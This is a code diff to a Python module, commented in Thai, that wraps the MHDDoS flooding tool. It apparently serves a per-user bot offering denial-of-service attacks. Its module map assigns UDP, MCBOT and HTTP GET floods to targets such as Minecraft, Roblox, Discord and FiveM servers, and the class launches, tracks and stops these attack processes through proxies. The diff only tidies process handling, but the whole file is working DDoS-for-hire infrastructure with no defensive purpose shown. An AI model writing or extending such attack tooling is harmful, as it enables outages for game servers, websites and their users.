@@ -2,9 +2,10 @@
 import asyncio
 import os
 import sys
-from config import MHDDOS_FULL, PROXIES_PER_DEVICE, proxy_attack_file
+from config import MHDDOS_FULL, MHDDOS_DIR, PROXIES_PER_DEVICE, proxy_attack_file
 
 
+# ปรับตาม MHDDoS version ที่ใช้ — verify ด้วย `python3 start.py --help`
 MODULE_MAP = {
     "minecraft":  ("L4", "MCBOT",  {}),
     "roblox":     ("L4", "UDP",    {}),
@@ -16,13 +17,16 @@ MODULE_MAP = {
     "http_flood": ("L7", "GET",    {"rpc": 128}),
 }
 
+# module ที่เป็น L4 → ไม่มี HTTP ให้วัด speed
+L4_MODULES = {"minecraft", "roblox", "discord", "fivem"}
+
 
 class MHDDoSEngine:
     def __init__(self):
         self.running: dict[int, asyncio.subprocess.Process] = {}
 
     def _build_cmd(self, module: str, target: str, port: int,
-                   duration: int, devices: int, proxies_path: str):
+                   duration: int, devices: int, proxies_path: str) -> list[str]:
         info = MODULE_MAP.get(module)
         if not info:
             raise ValueError(f"unknown module: {module}")
@@ -62,7 +66,7 @@ class MHDDoSEngine:
             *cmd,
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
-            cwd=os.path.dirname(MHDDOS_FULL),
+            cwd=MHDDOS_DIR,
         )
         self.running[user_id] = proc
         return proc
@@ -70,15 +74,22 @@ class MHDDoSEngine:
     async def stop(self, user_id: int):
         proc = self.running.pop(user_id, None)
         if proc and proc.returncode is None:
-            proc.terminate()
             try:
+                proc.terminate()
                 await asyncio.wait_for(proc.wait(), timeout=5)
             except asyncio.TimeoutError:
-                proc.kill()
+                try:
+                    proc.kill()
+                except ProcessLookupError:
+                    pass
+            except ProcessLookupError:
+                pass
 
     def is_running(self, user_id: int) -> bool:
-        return user_id in self.running
-
-    def is_alive(self, user_id: int) -> bool:
         proc = self.running.get(user_id)
         return proc is not None and proc.returncode is None
+
+    async def shutdown_all(self):
+        """เรียกตอน bot ปิด — terminate ทุก process"""
+        for uid in list(self.running.keys()):
+            await self.stop(uid)
